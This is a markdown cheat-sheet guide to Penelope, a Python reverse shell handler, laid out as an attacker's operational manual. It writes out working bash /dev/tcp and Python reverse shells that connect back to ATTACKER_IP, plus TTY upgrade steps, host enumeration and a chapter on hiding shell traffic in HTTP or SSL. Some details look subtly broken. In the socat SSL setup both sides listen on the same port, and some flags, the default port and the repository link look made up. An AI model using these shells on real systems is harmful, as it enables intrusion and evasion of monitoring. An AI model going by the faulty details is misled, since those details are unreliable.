---
title: "Penelope - Advanced Reverse Shell Handler"
description: "Python-based reverse shell handler with session management, multi-connection support, and automatic TTY stabilization"
category: "reverse_shells"
mitre_tactic: command_and_control
mitre_tactic_id: TA0011
github: "https://github.com/ytisf/penelope"
kali_install: "git clone https://github.com/ytisf/penelope.git && cd penelope && pip install -r requirements.txt"
---

# Penelope

## Overview

Penelope is an advanced reverse shell handler written in Python that provides session management, multiple simultaneous connections, automatic TTY stabilization, and file upload/download capabilities. Unlike basic netcat listeners, Penelope organizes reverse shells into managed sessions, enabling operators to switch between connections and execute post-exploitation commands efficiently.

## Chapter 1: Installation

### From GitHub

```bash
git clone https://github.com/ytisf/penelope.git
cd penelope
pip install -r requirements.txt
```

### Dependencies

```bash
pip install colorama prompt_toolkit
```

### Verify Installation

```bash
python3 penelope.py --help
```

## Chapter 2: Basic Usage

### Start Listener

```bash
python3 penelope.py
```

**Explanation**: Starts Penelope on the default port (1337). The handler listens for incoming reverse shell connections and automatically stabilizes TTY when possible.

### Custom Port

```bash
python3 penelope.py -p 4444
```

**Explanation**: Specifies the listening port as 4444 instead of the default. The handler will accept connections on this port.

### Verbose Mode

```bash
python3 penelope.py -v
```

**Explanation**: Enables verbose output showing connection details, incoming data, and handler operations. Useful for debugging connection issues.

## Chapter 3: Reverse Shell Setup

### Bash Reverse Shell

```bash
# Attacker
python3 penelope.py -p 4444

# Target
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**Explanation**: Penelope accepts the incoming connection and attempts to stabilize the shell automatically. The operator receives an interactive prompt with session identification.

### Python Reverse Shell

```python
# Target
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/sh","-i"])
```

**Explanation**: Penelope handles this connection and provides session management. The Python shell may not receive automatic TTY stabilization, but remains functional for command execution.

### Multiple Connections

```bash
# Start listener
python3 penelope.py -p 4444

# Multiple targets connect to the same port
# Each gets its own session with a unique ID
```

**Explanation**: Penelope manages multiple simultaneous connections, assigning each a session number. The operator can switch between sessions using the session management commands.

## Chapter 4: Session Management

### List Sessions

```
penelope> sessions
```

**Explanation**: Displays all active reverse shell sessions with their IDs, remote addresses, and status. Sessions are numbered sequentially.

### Switch Session

```
penelope> sessions -i 1
```

**Explanation**: Interacts with session 1, providing access to the remote shell. The operator can execute commands on the target system.

### Kill Session

```
penelope> sessions -k 2
```

**Explanation**: Terminates session 2 and closes the connection. The session is removed from the active session list.

### Background Session

```
penelope> background
```

**Explanation**: Returns to the Penelope command prompt while keeping the current session alive in the background. The session remains active and can be resumed later.

## Chapter 5: File Operations

### Upload File to Target

```
penelope> upload /local/path/file.txt /remote/path/file.txt
```

**Explanation**: Transfers a file from the attacker's machine to the target system through the established reverse shell connection. The file is sent in chunks to handle large files.

### Download File from Target

```
penelope> download /remote/path/file.txt /local/path/file.txt
```

**Explanation**: Retrieves a file from the target system to the attacker's machine. Penelope handles the transfer through the existing shell connection.

## Chapter 6: Post-Exploitation

### TTY Stabilization

Penelope attempts automatic TTY stabilization using Python's `pty` module. If automatic stabilization fails:

```bash
# Manual TTY upgrade on target
python3 -c 'import pty;pty.spawn("/bin/bash")'
# Ctrl+Z to background
stty raw -echo; fg
export TERM=xterm
```

**Explanation**: TTY stabilization provides features like tab completion, command history, and proper signal handling. This is essential for efficient post-exploitation work.

### System Enumeration

```bash
# Once shell is stabilized
whoami
id
uname -a
cat /etc/os-release
ifconfig
netstat -tlnp
```

**Explanation**: Basic enumeration commands help identify the compromised system's user, kernel version, network configuration, and running services.

## Chapter 7: Advanced Features

### Custom Shell Command

```bash
python3 penelope.py -p 4444 -c "/bin/bash"
```

**Explanation**: Specifies the shell command to execute when a connection is received. This can be used to force a specific shell or interpreter.

### Banner Display

```bash
python3 penelope.py --banner "Custom Banner"
```

**Explanation**: Sets a custom banner displayed when Penelope starts. Useful for distinguishing multiple handlers during complex operations.

### Logging

```bash
python3 penelope.py -p 4444 --log /path/to/logfile
```

**Explanation**: Logs all session activity to the specified file. This provides an audit trail of commands executed on target systems.

## Chapter 8: Evasion and Operational Security

### Connection through HTTP

Penelope can be combined with HTTP-based tools like chisel or socat to wrap the reverse shell connection in HTTP traffic, making it less conspicuous to network monitoring.

### Encrypted Connections

For encrypted reverse shells, use socat SSL or ncat SSL as the transport, then connect Penelope to the decrypted output:

```bash
# Socat SSL listener on target
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 EXEC:/bin/bash

# Penelope connects to the decrypted stream
python3 penelope.py -p 4444
```

**Explanation**: This approach encrypts the network traffic while maintaining Penelope's session management capabilities.

## Resources

- [Penelope GitHub Repository](https://github.com/ytisf/penelope)
- [Python Documentation](https://docs.python.org/)
- [Reverse Shell Cheat Sheet](https://github.com/swisskyrepo/PayloadsAllTheThings)
